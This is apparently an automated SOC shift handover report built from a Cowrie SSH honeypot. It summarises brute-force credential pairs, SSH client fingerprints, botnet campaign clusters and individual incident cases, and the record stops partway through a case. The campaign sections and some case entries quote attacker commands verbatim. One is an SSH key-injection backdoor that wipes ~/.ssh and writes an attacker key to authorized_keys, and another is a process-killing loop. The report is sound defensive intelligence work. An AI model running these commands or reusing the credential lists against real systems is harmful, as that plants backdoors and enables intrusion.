# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-29 |
| **Generated At** | 2026-07-29T14:19:50Z |
| **Shift Time** | 14:19 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **308** |
| Confirmed Threats | **268** |
| False Positives Filtered | **40** (13.0%) |
| Unique Attacker IPs | **144** |
| Countries of Origin | **39** |
| High Severity Cases | **139** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **169** |
| Malware Samples Analyzed | **4** HIGH · **29** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **172** |
| Unique Credential Pairs | **76** |
| Unique Usernames | **21** |
| Unique Passwords | **63** |
| Successful Auth Pairs | **138** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 66 |
| `admin` | 15 |
| `support` | 14 |
| `guest` | 12 |
| `operator` | 11 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `smo@@kkklss` | 10 |
| `3245gs5662d34` | 10 |
| `LeitboGi0ro` | 9 |
| `345gs5662d34` | 9 |
| `support` | 9 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `smo@@kkklss` | 10 |
| `root` | `LeitboGi0ro` | 9 |
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `123@@@` | 7 |
| `support` | `support` | 7 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-29T08:58:57 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-29T08:58:57 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-29T08:59:03 |
| `root` | `qwertyuiop123` | `114.111.53.214` | 2026-07-29T08:59:08 |
| `345gs5662d34` | `345gs5662d34` | `114.111.53.214` | 2026-07-29T08:59:11 |
| `root` | `3245gs5662d34` | `114.111.53.214` | 2026-07-29T08:59:13 |
| `support` | `147258369` | `24.97.253.246` | 2026-07-29T08:59:25 |
| `scraper` | `scraper` | `154.92.23.249` | 2026-07-29T09:01:32 |
| `345gs5662d34` | `345gs5662d34` | `154.92.23.249` | 2026-07-29T09:01:33 |
| `scraper` | `3245gs5662d34` | `154.92.23.249` | 2026-07-29T09:01:33 |
| `support` | `support` | `10.0.0.73` | 2026-07-29T09:04:03 |
| `root` | `stfu_and_be_quite` | `102.38.3.107` | 2026-07-29T09:09:44 |
| `root` | `stfu_and_be_quite` | `182.156.80.11` | 2026-07-29T09:09:53 |
| `debian` | `12345` | `10.0.0.73` | 2026-07-29T09:16:32 |
| `unknown` | `unknown1234567` | `10.0.0.73` | 2026-07-29T09:18:34 |
| `root` | `stfu_and_be_quite` | `10.0.0.73` | 2026-07-29T09:21:53 |
| `root` | `111111` | `2.57.122.209` | 2026-07-29T09:27:56 |
| `root` | `123` | `2.57.122.209` | 2026-07-29T09:30:46 |
| `unknown` | `unknown1234567` | `112.6.11.184` | 2026-07-29T09:32:19 |
| `unknown` | `unknown1234567` | `220.180.171.157` | 2026-07-29T09:32:34 |
| `root` | `123123` | `2.57.122.209` | 2026-07-29T09:33:43 |
| `debian` | `12345` | `144.22.210.132` | 2026-07-29T09:35:04 |
| `root` | `123321` | `2.57.122.209` | 2026-07-29T09:36:43 |
| `user1` | `1234` | `58.22.255.28` | 2026-07-29T09:39:31 |
| `root` | `1234` | `2.57.122.209` | 2026-07-29T09:39:35 |
| `user1` | `1234` | `39.183.162.243` | 2026-07-29T09:39:42 |
| `root` | `12345` | `2.57.122.209` | 2026-07-29T09:42:29 |
| `support` | `support` | `176.53.159.196` | 2026-07-29T09:45:14 |
| `root` | `1234567` | `2.57.122.209` | 2026-07-29T09:48:05 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-29T09:49:50 |
| `root` | `12345678` | `2.57.122.209` | 2026-07-29T09:50:35 |
| `operator` | `techsupport` | `10.0.0.73` | 2026-07-29T09:52:09 |
| `root` | `123456789` | `2.57.122.209` | 2026-07-29T09:53:02 |
| `admin` | `admin55` | `10.0.0.73` | 2026-07-29T09:53:20 |
| `root` | `1234abcd` | `2.57.122.209` | 2026-07-29T09:55:20 |
| `root` | `root1234567` | `10.0.0.73` | 2026-07-29T09:56:03 |
| `root` | `123abc` | `2.57.122.209` | 2026-07-29T09:57:55 |
| `admin` | `admin55` | `121.188.193.78` | 2026-07-29T09:58:54 |
| `admin` | `admin55` | `119.200.229.33` | 2026-07-29T09:59:07 |
| `root` | `123qwe` | `2.57.122.209` | 2026-07-29T10:00:23 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-29T10:01:59 |
| `root` | `1q2w3e` | `2.57.122.209` | 2026-07-29T10:02:39 |
| `root` | `1q2w3e4r` | `2.57.122.209` | 2026-07-29T10:05:11 |
| `root` | `1qaz2wsx` | `2.57.122.209` | 2026-07-29T10:07:25 |
| `root` | `321` | `2.57.122.209` | 2026-07-29T10:09:38 |
| `root` | `654321` | `2.57.122.209` | 2026-07-29T10:11:51 |
| `root` | `P@ssw0rd` | `2.57.122.209` | 2026-07-29T10:14:07 |
| `root` | `root1234567` | `65.20.202.4` | 2026-07-29T10:15:17 |
| `root` | `root1234567` | `90.230.168.26` | 2026-07-29T10:15:31 |
| `RPM` | `RPM` | `218.94.115.164` | 2026-07-29T10:15:40 |
| `root` | `root1234567` | `156.238.86.2` | 2026-07-29T10:15:53 |
| `root` | `P@ssword` | `2.57.122.209` | 2026-07-29T10:16:34 |
| `root` | `Root123` | `2.57.122.209` | 2026-07-29T10:18:33 |
| `default` | `default123456789` | `182.75.197.174` | 2026-07-29T10:20:53 |
| `default` | `default123456789` | `112.26.101.76` | 2026-07-29T10:21:10 |
| `admin` | `q1w2e3r4t5y6` | `137.184.228.138` | 2026-07-29T10:24:12 |
| `345gs5662d34` | `345gs5662d34` | `137.184.228.138` | 2026-07-29T10:24:14 |
| `admin` | `3245gs5662d34` | `137.184.228.138` | 2026-07-29T10:24:14 |
| `root` | `abc123456@` | `187.34.131.136` | 2026-07-29T10:24:44 |
| `345gs5662d34` | `345gs5662d34` | `187.34.131.136` | 2026-07-29T10:24:47 |
| `root` | `3245gs5662d34` | `187.34.131.136` | 2026-07-29T10:24:48 |
| `support` | `redhat123` | `10.0.0.73` | 2026-07-29T10:28:01 |
| `debian` | `debian9` | `10.0.0.73` | 2026-07-29T10:28:05 |
| `support` | `redhat123` | `117.222.52.247` | 2026-07-29T10:29:27 |
| `support` | `redhat123` | `220.134.25.203` | 2026-07-29T10:29:35 |
| `debian` | `debian9` | `36.92.35.211` | 2026-07-29T10:33:43 |
| `debian` | `debian9` | `113.140.95.2` | 2026-07-29T10:33:56 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-29T10:38:34 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-29T10:38:34 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-29T10:38:41 |
| `debian` | `debian9` | `218.4.156.254` | 2026-07-29T10:41:43 |
| `root` | `﻿------fuck------` | `45.205.18.52` | 2026-07-29T10:44:31 |
| `guest` | `qwerty12345` | `93.177.157.179` | 2026-07-29T10:50:53 |
| `guest` | `qwerty12345` | `197.251.249.75` | 2026-07-29T10:51:02 |
| `guest` | `p@ssw0rd` | `14.97.77.182` | 2026-07-29T10:56:44 |
| `guest` | `p@ssw0rd` | `85.105.255.56` | 2026-07-29T10:56:56 |
| `ubnt` | `ubnt1` | `10.0.0.73` | 2026-07-29T11:03:32 |
| `ubnt` | `ubnt1` | `220.163.252.244` | 2026-07-29T11:05:16 |
| `default` | `qwerty123456` | `117.205.3.26` | 2026-07-29T11:08:19 |
| `guest` | `p@ssw0rd` | `10.0.0.73` | 2026-07-29T11:08:41 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-29T11:10:50 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-29T11:10:50 |
| `default` | `qwerty123456` | `111.70.1.159` | 2026-07-29T11:16:27 |
| `default` | `qwerty123456` | `118.163.145.175` | 2026-07-29T11:16:35 |
| `ubnt` | `ubnt1` | `63.135.169.175` | 2026-07-29T11:22:08 |
| `ubnt` | `ubnt1` | `118.183.180.108` | 2026-07-29T11:22:22 |
| `guest` | `p@ssw0rd` | `111.70.39.214` | 2026-07-29T11:26:58 |
| `guest` | `p@ssw0rd` | `62.183.82.70` | 2026-07-29T11:27:05 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-07-29T11:28:15 |
| `root` | `123@@@` | `168.110.102.254` | 2026-07-29T11:28:15 |
| `unknown` | `unknown6` | `122.187.229.201` | 2026-07-29T11:32:19 |
| `root` | `` | `91.92.40.18` | 2026-07-29T11:36:17 |
| `admin` | `admin` | `91.92.40.18` | 2026-07-29T11:36:20 |
| `admin` | `password` | `10.0.0.73` | 2026-07-29T11:39:17 |
| `admin` | `password` | `196.188.93.169` | 2026-07-29T11:40:51 |
| `admin` | `password` | `223.210.27.53` | 2026-07-29T11:41:04 |
| `guest` | `1q2w3e` | `180.180.232.242` | 2026-07-29T11:43:15 |
| `guest` | `1q2w3e` | `169.211.232.182` | 2026-07-29T11:43:25 |
| `root` | `12qwaszx!@` | `144.225.187.57` | 2026-07-29T11:47:31 |
| `345gs5662d34` | `345gs5662d34` | `144.225.187.57` | 2026-07-29T11:47:33 |
| `root` | `3245gs5662d34` | `144.225.187.57` | 2026-07-29T11:47:34 |
| `guest` | `1q2w3e` | `65.20.134.97` | 2026-07-29T11:51:22 |
| `loguser` | `123456` | `179.176.210.17` | 2026-07-29T11:54:15 |
| `345gs5662d34` | `345gs5662d34` | `179.176.210.17` | 2026-07-29T11:54:18 |
| `loguser` | `3245gs5662d34` | `179.176.210.17` | 2026-07-29T11:54:19 |
| `unknown` | `333333333` | `182.75.197.174` | 2026-07-29T12:02:23 |
| `unknown` | `333333333` | `180.76.104.208` | 2026-07-29T12:02:32 |
| `pi` | `support` | `186.239.41.74` | 2026-07-29T12:08:02 |
| `support` | `qwer1234` | `10.0.0.73` | 2026-07-29T12:12:19 |
| `operator` | `asdfgh` | `10.0.0.73` | 2026-07-29T12:15:03 |
| `operator` | `asdfgh` | `211.169.212.206` | 2026-07-29T12:16:43 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `194.187.176.125` | 2026-07-29T12:16:59 |
| `support` | `qwer1234` | `179.185.18.67` | 2026-07-29T12:17:40 |
| `support` | `qwer1234` | `92.84.21.186` | 2026-07-29T12:17:52 |
| `loki` | `loki` | `43.130.249.176` | 2026-07-29T12:18:22 |
| `345gs5662d34` | `345gs5662d34` | `43.130.249.176` | 2026-07-29T12:18:25 |
| `loki` | `3245gs5662d34` | `43.130.249.176` | 2026-07-29T12:18:27 |
| `operator` | `operator88` | `10.0.0.73` | 2026-07-29T12:18:29 |
| `pi` | `support` | `10.0.0.73` | 2026-07-29T12:19:59 |
| `userm` | `1qq2w3e4r5t` | `31.77.146.148` | 2026-07-29T12:23:26 |
| `345gs5662d34` | `345gs5662d34` | `31.77.146.148` | 2026-07-29T12:23:28 |
| `userm` | `3245gs5662d34` | `31.77.146.148` | 2026-07-29T12:23:29 |
| `operator` | `asdfgh` | `36.64.211.93` | 2026-07-29T12:33:33 |
| `operator` | `asdfgh` | `213.154.80.51` | 2026-07-29T12:33:45 |
| `operator` | `operator88` | `111.70.23.222` | 2026-07-29T12:37:35 |
| `operator` | `operator88` | `122.160.59.87` | 2026-07-29T12:37:54 |
| `operator` | `operator88` | `203.192.247.84` | 2026-07-29T12:38:03 |
| `config` | `config` | `36.92.35.211` | 2026-07-29T12:43:30 |
| `config` | `config` | `188.219.104.210` | 2026-07-29T12:43:37 |
| `test` | `test66` | `10.0.0.73` | 2026-07-29T12:50:30 |
| `root` | `p@$$w0rd` | `106.243.87.164` | 2026-07-29T12:50:43 |
| `345gs5662d34` | `345gs5662d34` | `106.243.87.164` | 2026-07-29T12:50:47 |
| `root` | `3245gs5662d34` | `106.243.87.164` | 2026-07-29T12:50:48 |
| `pi` | `test` | `157.20.228.20` | 2026-07-29T12:52:15 |
| `pi` | `test` | `107.135.117.245` | 2026-07-29T12:52:28 |
| `deployuser` | `12345` | `134.112.56.47` | 2026-07-29T12:53:18 |
| `deployuser` | `3245gs5662d34` | `134.112.56.47` | 2026-07-29T12:53:34 |
| `guest` | `admin` | `10.0.0.73` | 2026-07-29T12:54:15 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **308** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 54 |
| libssh | 41 |
| Go SSH scanner | 29 |
| Paramiko (Python) | 27 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 54 | 52 |
| `f555226df196...` | Mirai/variant | 27 | 10 |
| `a2de0f306611...` | Mirai/variant | 22 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 21 | 1 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 54 | 52 | Mirai/variant |
| `f555226df196...` | libssh | 27 | 10 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 22 | 3 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 21 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 20 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo WRITABLE >/tmp/.testfile 2>&1
```
```
ls -l /tmp/.testfile 2>&1
```
```
rm -f /tmp/.testfile
```
```
cd /tmp
```
```
for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; if [ -r "$pid/maps" ]; then suspicious=true; while IFS= read -r line; do case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then kill -9 "$pid_num" 2>/dev/null; fi; fi; done;
```
Source IPs: `91.92.40.18`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.209`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `137.184.228.138`, `154.92.23.249`, `144.225.187.57`, `31.77.146.148`, `106.243.87.164`, `114.111.53.214`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **144** |
| Unique ASNs | **90** |
| High-Risk ASNs | **69** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 13 | HIGH |
| `AS22773` | Cox Communications Inc. | 7 | MEDIUM |
| `AS31898` | Oracle Corporation | 6 | HIGH |
| `AS46562` | Performive LLC | 5 | LOW |
| `AS209334` | Modat B.V. | 4 | HIGH |
| `AS17421` | Mobile Business Group | 3 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS48721` | Flyservers S.A. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (139)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-cc3dc88daec6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 08:58 |
| **Last Seen** | 2026-07-29 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 08:58:56` | `cowrie.session.connect` |
| `2026-07-29 08:58:56` | `cowrie.client.version` |
| `2026-07-29 08:58:56` | `cowrie.client.kex` |
| `2026-07-29 08:58:57` | `cowrie.login.success` |
| `2026-07-29 08:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd844ffded72

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 08:58 |
| **Last Seen** | 2026-07-29 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 08:58:56` | `cowrie.session.connect` |
| `2026-07-29 08:58:56` | `cowrie.client.version` |
| `2026-07-29 08:58:56` | `cowrie.client.kex` |
| `2026-07-29 08:58:57` | `cowrie.login.success` |
| `2026-07-29 08:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d2c6133e66e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 08:59 |
| **Last Seen** | 2026-07-29 08:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 08:59:02` | `cowrie.session.connect` |
| `2026-07-29 08:59:02` | `cowrie.client.version` |
| `2026-07-29 08:59:02` | `cowrie.client.kex` |
| `2026-07-29 08:59:03` | `cowrie.login.success` |
| `2026-07-29 08:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb3567387827

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 08:59 |
| **Last Seen** | 2026-07-29 08:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 08:59:03` | `cowrie.session.connect` |
| `2026-07-29 08:59:03` | `cowrie.client.version` |
| `2026-07-29 08:59:03` | `cowrie.client.kex` |
| `2026-07-29 08:59:04` | `cowrie.login.success` |
| `2026-07-29 08:59:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38c3701d199d

| Field | Detail |
|---|---|
| **Source IP** | `114.111.53[.]214` |
| **First Seen** | 2026-07-29 08:59 |
| **Last Seen** | 2026-07-29 08:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 08:59:06` | `cowrie.session.connect` |
| `2026-07-29 08:59:06` | `cowrie.client.version` |
| `2026-07-29 08:59:07` | `cowrie.client.kex` |
| `2026-07-29 08:59:08` | `cowrie.login.success` |
| `2026-07-29 08:59:09` | `cowrie.session.params` |
| `2026-07-29 08:59:09` | `cowrie.command.input` |
| `2026-07-29 08:59:09` | `cowrie.command.failed` |
| `2026-07-29 08:59:09` | `cowrie.log.closed` |
| `2026-07-29 08:59:10` | `cowrie.session.params` |
| `2026-07-29 08:59:10` | `cowrie.command.input` |
| `2026-07-29 08:59:10` | `cowrie.session.file_download` |
| `2026-07-29 08:59:10` | `cowrie.log.closed` |
| `2026-07-29 08:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.53[.]214` to AbuseIPDB if not already reported
- [ ] Block `114.111.53[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e4ce9f83a17

| Field | Detail |
|---|---|
| **Source IP** | `114.111.53[.]214` |
| **First Seen** | 2026-07-29 08:59 |
| **Last Seen** | 2026-07-29 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 08:59:10` | `cowrie.session.connect` |
| `2026-07-29 08:59:10` | `cowrie.client.version` |
| `2026-07-29 08:59:11` | `cowrie.client.kex` |
| `2026-07-29 08:59:11` | `cowrie.login.success` |
| `2026-07-29 08:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.53[.]214` to AbuseIPDB if not already reported
- [ ] Block `114.111.53[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2cca7a2fe1

| Field | Detail |
|---|---|
| **Source IP** | `114.111.53[.]214` |
| **First Seen** | 2026-07-29 08:59 |
| **Last Seen** | 2026-07-29 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 08:59:12` | `cowrie.session.connect` |
| `2026-07-29 08:59:12` | `cowrie.client.version` |
| `2026-07-29 08:59:12` | `cowrie.client.kex` |
| `2026-07-29 08:59:13` | `cowrie.login.success` |
| `2026-07-29 08:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.53[.]214` to AbuseIPDB if not already reported
- [ ] Block `114.111.53[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9553aa96939c

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-07-29 08:59 |
| **Last Seen** | 2026-07-29 09:04 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 08:59:24` | `cowrie.session.connect` |
| `2026-07-29 08:59:24` | `cowrie.client.version` |
| `2026-07-29 08:59:24` | `cowrie.client.kex` |
| `2026-07-29 08:59:25` | `cowrie.login.success` |
| `2026-07-29 08:59:25` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d1488b8d787

| Field | Detail |
|---|---|
| **Source IP** | `154.92.23[.]249` |
| **First Seen** | 2026-07-29 09:01 |
| **Last Seen** | 2026-07-29 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:01:32` | `cowrie.session.connect` |
| `2026-07-29 09:01:32` | `cowrie.client.version` |
| `2026-07-29 09:01:32` | `cowrie.client.kex` |
| `2026-07-29 09:01:32` | `cowrie.login.success` |
| `2026-07-29 09:01:32` | `cowrie.session.params` |
| `2026-07-29 09:01:32` | `cowrie.command.input` |
| `2026-07-29 09:01:32` | `cowrie.command.failed` |
| `2026-07-29 09:01:32` | `cowrie.log.closed` |
| `2026-07-29 09:01:33` | `cowrie.session.params` |
| `2026-07-29 09:01:33` | `cowrie.command.input` |
| `2026-07-29 09:01:33` | `cowrie.session.file_download` |
| `2026-07-29 09:01:33` | `cowrie.log.closed` |
| `2026-07-29 09:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
